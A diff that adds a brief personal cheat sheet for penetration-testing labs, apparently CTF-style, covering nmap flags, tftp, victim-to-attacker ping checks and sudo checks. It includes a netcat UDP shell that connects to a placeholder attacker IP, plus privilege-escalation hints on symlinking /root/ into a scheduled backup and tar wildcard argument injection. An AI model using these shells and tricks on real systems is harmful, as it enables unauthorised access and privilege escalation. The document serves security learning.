@@ -1,0 +1,49 @@
+nmap:
+    -p- --> scan all ports
+    -sV --> service version detection
+    -sU --> service UDP scan
+    -sS --> service TCP scan
+    -oA --> output to a file
+
+tftp:
+    get file:
+        get <filename>
+    put file:
+        put <filename>
+    quit:
+        quit
+
+python interactive console:
+    os, getpass and pwd modules
+
+
+pinging from the victim machine:
+- confirm connectivity between a victim and attacker machine
+ping -c 1 <attacker_ip>
+tcpdump -i tun0 -n icmp
+
+UDP shells:
+- nc -u -lnvp <port>
+- nc -u -nv <attacker_ip> <port>
+
+- dpkg -l sudo --> to check if sudo is installed and its version
+- sudo -l --> to check if sudo is enabled
+
+
+- symbolic-links
+    - ln -s <target> <link>
+        Example:
+        1. Create a symbolic link to /var/log/syslog:
+            sudo ln -s /var/log/syslog /tmp/syslog_link
+        2. Verify:
+            ls -l /tmp/syslog_link
+            Output:
+            lrwxrwxrwx 1 root root 13 Jan 12 12:00 /tmp/syslog_link -> /var/log/syslog
+    - ls -l <link>
+    - rm <link>
+
+- defensecode.com tar wild card
+
+- symbolic link when the backup is being done every 5 minutes
+    - ln -s /root/ <link>
+- when you add arguments e.g. touch -- -la 
